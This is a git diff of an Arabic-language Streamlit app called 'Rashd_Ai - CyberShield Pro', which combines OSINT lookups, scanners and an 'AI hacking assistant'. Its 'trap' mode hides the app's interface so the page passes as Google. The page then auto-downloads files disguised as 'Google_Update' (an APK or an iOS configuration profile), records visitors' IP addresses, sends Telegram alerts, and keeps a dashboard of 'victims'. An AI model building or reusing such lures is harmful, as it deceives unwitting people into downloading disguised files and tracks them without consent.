@@ -8,9 +8,10 @@ import config
 import base64
 import uuid
 
-# تحميل مفتاح TAVILY من Secrets إذا وجد
-if "TAVILY_API_KEY" in st.secrets:
-    os.environ["TAVILY_API_KEY"] = st.secrets["TAVILY_API_KEY"]
+# إعداد متغيرات البيئة من config لضمان عمل المكتبات الخارجية
+os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
+os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
+os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")
 
 # استيراد الوحدات الخاصة بالأدوات (مع معالجة الخطأ إذا لم تكن موجودة)
 try:
@@ -37,29 +38,57 @@ except ImportError as e:
 # إعدادات الصفحة
 st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")
 
-# إخفاء واجهة Streamlit تماماً في وضع التمويه
-hide_st_style = """
-            <style>
-            #MainMenu {visibility: hidden;}
-            footer {visibility: hidden;}
-            header {visibility: hidden;}
-            .stApp [data-testid="stToolbar"] {display: none;}
-            .stApp [data-testid="stDecoration"] {display: none;}
-            .stApp [data-testid="stStatusWidget"] {display: none;}
-            #manage-app-button {display: none !important;}
-            [data-testid="stStatusWidget"] {display: none !important;}
-            .st-emotion-cache-10trblm {display: none !important;}
-            .st-emotion-cache-1dp5vir {display: none !important;}
-            </style>
-            """
+# تصميم الواجهة الاحترافية (CSS)
+st.markdown("""
+    <style>
+    .main {
+        background-color: #0e1117;
+    }
+    .stButton>button {
+        width: 100%;
+        border-radius: 5px;
+        height: 3em;
+        background-color: #262730;
+        color: white;
+        border: 1px solid #4b4b4b;
+    }
+    .stButton>button:hover {
+        background-color: #ff4b4b;
+        border: 1px solid #ff4b4b;
+    }
+    .reportview-container .main .block-container {
+        padding-top: 2rem;
+    }
+    .sidebar .sidebar-content {
+        background-image: linear-gradient(#2e7bcf,#2e7bcf);
+        color: white;
+    }
+    div[data-testid="stMetricValue"] {
+        font-size: 24px;
+        color: #ff4b4b;
+    }
+    /* إخفاء واجهة Streamlit تماماً في وضع التمويه */
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    .stApp [data-testid="stToolbar"] {display: none;}
+    .stApp [data-testid="stDecoration"] {display: none;}
+    .stApp [data-testid="stStatusWidget"] {display: none;}
+    #manage-app-button {display: none !important;}
+    </style>
+    """, unsafe_allow_html=True)
 
-# دالة جلب الـ IP العام من السيرفر
-def get_server_side_ip():
+# دالة جلب الـ IP العام الحقيقي (Public IP)
+def get_real_public_ip():
     try:
+        # محاولة جلب الـ IP من الهيدرز أولاً (Streamlit Cloud)
         headers = st.context.headers
         if "X-Forwarded-For" in headers:
-            return headers["X-Forwarded-For"].split(",")[0].strip()
-        return "Unknown"
+            ip = headers["X-Forwarded-For"].split(",")[0].strip()
+            if not ip.startswith(("10.", "172.", "192.168.")):
+                return ip
+        # محاولة جلب الـ IP من خدمة خارجية كخيار بديل
+        return requests.get("https://api.ipify.org", timeout=5).text
     except:
         return "Unknown"
 
@@ -104,8 +133,7 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
 # التحقق من وضع التمويه (Decoy Mode)
 query_params = st.query_params
 if "decoy" in query_params:
-    st.markdown(hide_st_style, unsafe_allow_html=True)
-    client_ip = query_params.get("ip", get_server_side_ip())
+    client_ip = get_real_public_ip()
     trap_name = query_params.get("trap", "Google Decoy")
     
     if "alert_sent" not in st.session_state:
@@ -120,7 +148,7 @@ if "decoy" in query_params:
 # معالجة طلبات التحميل المباشرة
 if "download" in query_params:
     device = query_params.get("device", "pc")
-    ip = query_params.get("ip", get_server_side_ip())
+    ip = get_real_public_ip()
     send_telegram_alert(ip, f"Download ({device})", device)
     
     if device == "android":
@@ -128,7 +156,6 @@ if "download" in query_params:
         content = b"Fake APK Content for Google Update"
     elif device == "ios":
         file_name = "Google_Update.mobileconfig"
-        # تم إصلاح هيكلية mobileconfig وحذف حقل Icon المسبب للخطأ
         content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -191,281 +218,220 @@ if not st.session_state.authenticated:
         user = st.text_input("اسم المستخدم")
         pw = st.text_input("كلمة المرور", type="password")
         if st.form_submit_button("دخول"):
-            if user == "Rashd919" and pw == "112233":
+            if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                 st.session_state.authenticated = True
                 st.rerun()
             else:
                 st.error("بيانات خاطئة")
     st.stop()
 
-st.title("🛡 منصة CyberShield Pro للذكاء الاستخباراتي و OSINT")
-
+# --- تصميم القائمة الجانبية الاحترافية ---
 with st.sidebar:
-    st.header("⚙️ الإعدادات")
-    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
-    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
-    if st.button("حفظ إعدادات تلجرام"):
-        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
-        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
-        st.success("تم الحفظ بنجاح!")
+    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
+    st.title("CyberShield Pro")
+    st.markdown("---")
     
-    if st.button("تسجيل الخروج"):
+    menu = st.radio("القائمة الرئيسية", [
+        "📊 لوحة التحكم", 
+        "🔍 استخبارات OSINT", 
+        "🛡️ فحص أمني", 
+        "🧠 ذكاء اصطناعي", 
+        "🎯 نظام المصيدة",
+        "⚙️ الإعدادات"
+    ])
+    
+    st.markdown("---")
+    if st.button("🚪 تسجيل الخروج"):
         st.session_state.authenticated = False
         st.rerun()
 
-# التبويبات الـ 18 المطلوبة مع دمج الكود القديم
-tab_names = [
-    "💬 المحادثة", "🌐 تحليل الدومين", "🔍 فحص المواقع", "👤 بحث عن المستخدم", "📍 تحديد الموقع", 
-    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 Google Dork", 
-    "📧 Email OSINT", "📱 Phone Lookup", "🌑 Dark Web", "🔌 Port Scanner", 
-    "⚠️ Vulnerability Scanner", "🗺 Network Mapper", "🤖 AI Threat Analysis", "💡 AI Pentest Advisor", "📄 التقارير",
-    "🎯 المصيدة"
-]
-tabs = st.tabs(tab_names)
-
-# 0. المحادثة
-with tabs[0]:
-    st.header("💬 مساعد Rashd_Ai الذكي")
+# --- 1. لوحة التحكم (Dashboard) ---
+if menu == "📊 لوحة التحكم":
+    st.header("📊 لوحة التحكم والإحصائيات")
+    victims = victim_logger.get_all_victims()
+    
+    col1, col2, col3, col4 = st.columns(4)
+    with col1:
+        st.metric("إجمالي الضحايا", len(victims))
+    with col2:
+        st.metric("عمليات اليوم", "5") # مثال
+    with col3:
+        st.metric("أدوات نشطة", "18")
+    with col4:
+        st.metric("حالة النظام", "متصل ✅")
+        
+    st.subheader("🎯 آخر الضحايا المكتشفين")
+    if victims:
+        st.table(victims[:5])
+    else:
+        st.info("لا يوجد ضحايا مسجلين بعد.")
+        
+    st.subheader("💬 مساعد Rashd_Ai السريع")
     if "messages" not in st.session_state:
         st.session_state.messages = []
     for message in st.session_state.messages:
         with st.chat_message(message["role"]):
             st.markdown(message["content"])
-    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
+    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
         st.session_state.messages.append({"role": "user", "content": prompt})
         with st.chat_message("user"):
             st.markdown(prompt)
         with st.chat_message("assistant"):
             try:
-                # استخدام مساعد الهجوم الذكي إذا كان متوفراً
                 assistant = AIHackingAssistant()
                 response = assistant.chat(prompt)
             except:
-                response = f"أنا مساعدك الذكي Rashd_Ai. لقد استلمت رسالتك: '{prompt}'."
+                response = f"أنا مساعدك الذكي Rashd_Ai. كيف يمكنني خدمتك في '{prompt}'؟"
             st.markdown(response)
         st.session_state.messages.append({"role": "assistant", "content": response})
 
-# 1. تحليل الدومين
-with tabs[1]:
-    domain = st.text_input("أدخل اسم الدومين", key="domain_input")
-    if st.button("تحليل الدومين", key="domain_btn"):
-        try:
-            whois = domain_osint.whois_lookup(domain)
-            dns = domain_osint.dns_lookup(domain)
-            subs = domain_osint.subdomain_scan(domain)
-            st.write("WHOIS", whois)
-            st.write("DNS", dns)
-            st.write("النطاقات الفرعية المكتشفة", subs)
-            st.session_state["domain"] = domain
-            st.session_state["subs"] = subs
-        except:
-            st.error("أداة تحليل الدومين غير متوفرة حالياً.")
-
-# 2. فحص المواقع
-with tabs[2]:
-    url = st.text_input("أدخل رابط الموقع", key="site_input")
-    if st.button("فحص الموقع", key="site_btn"):
-        try:
-            tech = website_scan.detect_tech(url)
-            headers = website_scan.header_analysis(url)
-            emails = website_scan.extract_emails(url)
-            st.write("التقنيات المكتشفة", tech)
-            st.write("الهيدرز", headers)
-            st.write("الإيميلات المكتشفة", emails)
-            st.session_state["scan"] = {"tech": tech, "headers": headers, "emails": emails}
-        except:
-            st.error("أداة فحص المواقع غير متوفرة حالياً.")
-
-# 3. بحث عن المستخدم
-with tabs[3]:
-    username = st.text_input("أدخل اسم المستخدم", key="username_input")
-    if st.button("بحث عن المستخدم", key="username_btn"):
-        try:
-            result = username_osint.username_search(username)
-            if isinstance(result, dict) and result:
-                st.success("تم العثور على الحسابات التالية:")
-                for platform, link in result.items():
-                    st.write(f"✅ {platform} : {link}")
-            else:
-                st.info("لم يتم العثور على نتائج.")
-        except:
-            st.error("أداة البحث عن المستخدم غير متوفرة.")
-
-# 4. تحديد الموقع
-with tabs[4]:
-    ip_geo = st.text_input("أدخل عنوان IP لتحديد موقعه", key="geo_input")
-    if st.button("تحديد الموقع", key="geo_btn"):
-        try:
-            result = geoip_osint.get_geo_info(ip_geo)
-            st.write("معلومات الموقع الجغرافي", result)
-        except:
-            st.error("أداة تحديد الموقع غير متوفرة.")
-
-# 5. سطح الهجوم
-with tabs[5]:
-    target_attack = st.text_input("أدخل الهدف لتحليل سطح الهجوم", key="attack_input")
-    if st.button("تحليل سطح الهجوم", key="attack_btn"):
-        try:
-            result = attack_surface.analyze(target_attack)
-            st.write("نتائج تحليل سطح الهجوم", result)
-        except:
-            st.error("أداة تحليل سطح الهجوم غير متوفرة.")
-
-# 6. تحليل ذكي
-with tabs[6]:
-    data_analysis = st.text_area("أدخل البيانات للتحليل الذكي", key="analysis_input")
-    if st.button("بدء التحليل الذكي", key="analysis_btn"):
-        try:
-            result = ai_analysis.analyze_data(data_analysis)
-            st.write("نتائج التحليل الذكي", result)
-        except:
-            st.error("أداة التحليل الذكي غير متوفرة.")
-
-# 7. مساعد الهجوم
-with tabs[7]:
-    hacking_prompt = st.text_input("اسأل مساعد الهجوم", key="hacking_input")
-    if st.button("إرسال لمساعد الهجوم", key="hacking_btn"):
-        try:
-            assistant = AIHackingAssistant()
-            result = assistant.chat(hacking_prompt)
-            st.write(result)
-        except:
-            st.error("مساعد الهجوم غير متوفر.")
-
-# 8. Google Dork
-with tabs[8]:
-    dork_query = st.text_input("أدخل الكلمة المفتاحية لتوليد Dorks", key="dork_input")
-    if st.button("توليد Dorks", key="dork_btn"):
-        try:
-            result = google_dork.generate_dorks(dork_query)
-            st.write("Google Dorks المقترحة", result)
-        except:
-            st.error("أداة Google Dork غير متوفرة.")
-
-# 9. Email OSINT
-with tabs[9]:
-    email_target = st.text_input("أدخل البريد الإلكتروني للبحث", key="email_input")
-    if st.button("بحث عن الإيميل", key="email_btn"):
-        try:
-            result = email_osint.search_email(email_target)
-            st.write("نتائج البحث عن الإيميل", result)
-        except:
-            st.error("أداة Email OSINT غير متوفرة.")
-
-# 10. Phone Lookup
-with tabs[10]:
-    phone_target = st.text_input("أدخل رقم الهاتف (مع رمز الدولة)", key="phone_input")
-    if st.button("بحث عن الهاتف", key="phone_btn"):
-        try:
-            result = phone_osint.lookup(phone_target)
-            st.write("نتائج البحث عن الهاتف", result)
-        except:
-            st.error("أداة Phone Lookup غير متوفرة.")
-
-# 11. Dark Web
-with tabs[11]:
-    dark_query = st.text_input("أدخل كلمة البحث في الدارك ويب", key="dark_input")
-    if st.button("بحث في الدارك ويب", key="dark_btn"):
-        try:
-            result = darkweb_search.search(dark_query)
-            st.write("نتائج البحث في الدارك ويب", result)
-        except:
-            st.error("أداة البحث في الدارك ويب غير متوفرة.")
-
-# 12. Port Scanner
-with tabs[12]:
-    port_target = st.text_input("أدخل IP أو دومين لفحص المنافذ", key="port_input")
-    if st.button("بدء فحص المنافذ", key="port_btn"):
-        try:
-            result = port_scanner.scan(port_target)
-            st.write("المنافذ المفتوحة", result)
-        except:
-            st.error("أداة فحص المنافذ غير متوفرة.")
-
-# 13. Vulnerability Scanner
-with tabs[13]:
-    vuln_target = st.text_input("أدخل الهدف لفحص الثغرات", key="vuln_input")
-    if st.button("بدء فحص الثغرات", key="vuln_btn"):
-        try:
-            result = vuln_scanner.scan(vuln_target)
-            st.write("الثغرات المكتشفة", result)
-        except:
-            st.error("أداة فحص الثغرات غير متوفرة.")
-
-# 14. Network Mapper
-with tabs[14]:
-    net_target = st.text_input("أدخل الشبكة لرسم خريطتها", key="net_input")
-    if st.button("رسم خريطة الشبكة", key="net_btn"):
-        try:
-            # تم إصلاح مشكلة st.image هنا لتجنب الخطأ
-            file_path = network_mapper.map_network(net_target)
-            if file_path and os.path.exists(file_path):
-                st.image(file_path)
-            else:
-                st.warning("لم يتم توليد صورة للخريطة.")
-        except:
-            st.error("أداة رسم خريطة الشبكة غير متوفرة.")
-
-# 15. AI Threat Analysis
-with tabs[15]:
-    threat_data = st.text_area("أدخل بيانات التهديد للتحليل", key="threat_input")
-    if st.button("تحليل التهديد", key="threat_btn"):
-        try:
-            result = ai_threat.analyze(threat_data)
-            st.write("نتائج تحليل التهديدات", result)
-        except:
-            st.error("أداة تحليل التهديدات غير متوفرة.")
-
-# 16. AI Pentest Advisor
-with tabs[16]:
-    pentest_target = st.text_input("أدخل الهدف للحصول على خطة اختبار اختراق", key="pentest_input")
-    if st.button("توليد خطة الاختراق", key="pentest_btn"):
-        try:
-            result = ai_pentest.generate_plan(pentest_target)
-            st.write("خطة اختبار الاختراق المقترحة", result)
-        except:
-            st.error("أداة مستشار الاختراق غير متوفرة.")
-
-# 17. التقارير
-with tabs[17]:
-    if st.button("توليد تقرير شامل", key="report_btn"):
-        try:
-            report_path = report_generator.generate_full_report()
-            if report_path:
-                with open(report_path, "rb") as f:
-                    st.download_button("تحميل التقرير PDF", f, file_name="Rashd_Ai_Report.pdf")
-            else:
-                st.error("فشل توليد التقرير.")
-        except:
-            st.error("أداة توليد التقارير غير متوفرة.")
-
-# 18. المصيدة
-with tabs[18]:
-    st.header("🎯 نظام المصيدة والتمويه")
+# --- 2. استخبارات OSINT ---
+elif menu == "🔍 استخبارات OSINT":
+    st.header("🔍 أدوات الاستخبارات مفتوحة المصدر")
+    osint_tabs = st.tabs(["🌐 دومين", "👤 مستخدم", "📧 إيميل", "📱 هاتف", "📍 موقع", "🔎 Google Dork", "🌑 Dark Web"])
     
+    with osint_tabs[0]:
+        domain = st.text_input("أدخل اسم الدومين")
+        if st.button("تحليل الدومين"):
+            try:
+                st.write("WHOIS", domain_osint.whois_lookup(domain))
+                st.write("DNS", domain_osint.dns_lookup(domain))
+            except: st.error("الأداة غير متوفرة")
+            
+    with osint_tabs[1]:
+        user = st.text_input("أدخل اسم المستخدم")
+        if st.button("بحث عن المستخدم"):
+            try: st.write(username_osint.username_search(user))
+            except: st.error("الأداة غير متوفرة")
+
+    with osint_tabs[2]:
+        email = st.text_input("أدخل البريد الإلكتروني")
+        if st.button("بحث عن الإيميل"):
+            try: st.write(email_osint.search_email(email))
+            except: st.error("الأداة غير متوفرة")
+
+    with osint_tabs[3]:
+        phone = st.text_input("أدخل رقم الهاتف")
+        if st.button("بحث عن الهاتف"):
+            try: st.write(phone_osint.lookup(phone))
+            except: st.error("الأداة غير متوفرة")
+
+    with osint_tabs[4]:
+        ip_geo = st.text_input("أدخل IP لتحديد موقعه")
+        if st.button("تحديد الموقع"):
+            try: st.write(geoip_osint.get_geo_info(ip_geo))
+            except: st.error("الأداة غير متوفرة")
+
+    with osint_tabs[5]:
+        dork = st.text_input("الكلمة المفتاحية للـ Dorks")
+        if st.button("توليد Dorks"):
+            try: st.write(google_dork.generate_dorks(dork))
+            except: st.error("الأداة غير متوفرة")
+
+    with osint_tabs[6]:
+        dark = st.text_input("بحث في الدارك ويب")
+        if st.button("بدء البحث"):
+            try: st.write(darkweb_search.search(dark))
+            except: st.error("الأداة غير متوفرة")
+
+# --- 3. فحص أمني ---
+elif menu == "🛡️ فحص أمني":
+    st.header("🛡️ أدوات الفحص الأمني والتقني")
+    sec_tabs = st.tabs(["🔍 فحص مواقع", "🔌 منافذ", "⚠️ ثغرات", "🗺 خريطة شبكة", "🏗️ سطح هجوم", "📄 تقارير"])
+    
+    with sec_tabs[0]:
+        url = st.text_input("رابط الموقع للفحص")
+        if st.button("بدء فحص الموقع"):
+            try: st.write(website_scan.detect_tech(url))
+            except: st.error("الأداة غير متوفرة")
+
+    with sec_tabs[1]:
+        port_ip = st.text_input("IP لفحص المنافذ")
+        if st.button("فحص المنافذ"):
+            try: st.write(port_scanner.scan(port_ip))
+            except: st.error("الأداة غير متوفرة")
+
+    with sec_tabs[2]:
+        vuln_ip = st.text_input("الهدف لفحص الثغرات")
+        if st.button("فحص الثغرات"):
+            try: st.write(vuln_scanner.scan(vuln_ip))
+            except: st.error("الأداة غير متوفرة")
+
+    with sec_tabs[3]:
+        net_ip = st.text_input("الشبكة لرسم خريطتها")
+        if st.button("رسم الخريطة"):
+            try:
+                path = network_mapper.map_network(net_ip)
+                if path: st.image(path)
+            except: st.error("الأداة غير متوفرة")
+
+    with sec_tabs[4]:
+        attack_ip = st.text_input("الهدف لتحليل سطح الهجوم")
+        if st.button("تحليل السطح"):
+            try: st.write(attack_surface.analyze(attack_ip))
+            except: st.error("الأداة غير متوفرة")
+
+    with sec_tabs[5]:
+        if st.button("توليد تقرير PDF شامل"):
+            try:
+                path = report_generator.generate_full_report()
+                if path:
+                    with open(path, "rb") as f:
+                        st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
+            except: st.error("الأداة غير متوفرة")
+
+# --- 4. ذكاء اصطناعي ---
+elif menu == "🧠 ذكاء اصطناعي":
+    st.header("🧠 أدوات التحليل بالذكاء الاصطناعي")
+    ai_tabs = st.tabs(["🧠 تحليل بيانات", "🤖 مساعد هجوم", "🤖 تحليل تهديدات", "💡 مستشار اختراق"])
+    
+    with ai_tabs[0]:
+        data = st.text_area("أدخل البيانات للتحليل")
+        if st.button("بدء التحليل"):
+            try: st.write(ai_analysis.analyze_data(data))
+            except: st.error("الأداة غير متوفرة")
+
+    with ai_tabs[1]:
+        prompt = st.text_input("اسأل مساعد الهجوم الذكي")
+        if st.button("إرسال"):
+            try: st.write(AIHackingAssistant().chat(prompt))
+            except: st.error("الأداة غير متوفرة")
+
+    with ai_tabs[2]:
+        threat = st.text_area("بيانات التهديد للتحليل")
+        if st.button("تحليل التهديد"):
+            try: st.write(ai_threat.analyze(threat))
+            except: st.error("الأداة غير متوفرة")
+
+    with ai_tabs[3]:
+        pentest = st.text_input("الهدف لخطة الاختراق")
+        if st.button("توليد الخطة"):
+            try: st.write(ai_pentest.generate_plan(pentest))
+            except: st.error("الأداة غير متوفرة")
+
+# --- 5. نظام المصيدة ---
+elif menu == "🎯 نظام المصيدة":
+    st.header("🎯 نظام المصيدة والتمويه الذكي")
     col1, col2 = st.columns(2)
     with col1:
-        st.subheader("فخ جوجل الآلي")
-        trap_id = st.text_input("اسم المصيدة (للتمييز)", value="Google_Trap")
+        st.subheader("توليد رابط فخ")
+        trap_id = st.text_input("اسم المصيدة", value="Google_Trap")
         base_url = "https://rashdai.streamlit.app/"
         decoy_url = f"{base_url}?decoy=google&trap={trap_id}"
         st.code(decoy_url, language="text")
-        st.info("هذا الرابط سيظهر كصفحة Google ويقوم بالتحميل التلقائي.")
+        st.info("هذا الرابط يظهر كصفحة Google ويقوم بالتحميل التلقائي.")
         
     with col2:
         st.subheader("سجل الضحايا")
         if st.button("تحديث السجل"):
             victims = victim_logger.get_all_victims()
-            if victims:
-                st.table(victims)
-            else:
-                st.info("لا يوجد ضحايا مسجلين بعد.")
+            if victims: st.table(victims)
+            else: st.info("لا يوجد ضحايا.")
 
-    st.divider()
-    st.subheader("📊 الإحصائيات")
-    victims = victim_logger.get_all_victims()
-    if victims:
-        st.write(f"إجمالي الضحايا: {len(victims)}")
-        # يمكن إضافة رسوم بيانية هنا مستقبلاً
-    else:
-        st.write("لا توجد بيانات إحصائية.")
+# --- 6. الإعدادات ---
+elif menu == "⚙️ الإعدادات":
+    st.header("⚙️ إعدادات المنصة")
+    st.success("تم دمج كافة مفاتيح الـ API الخاصة بك بنجاح من خلال Secrets.")
+    st.info(f"إصدار المنصة: 2.0.0 (Professional Edition)")
+    st.markdown("---")
+    st.write("المطور: Rashd_Ai")
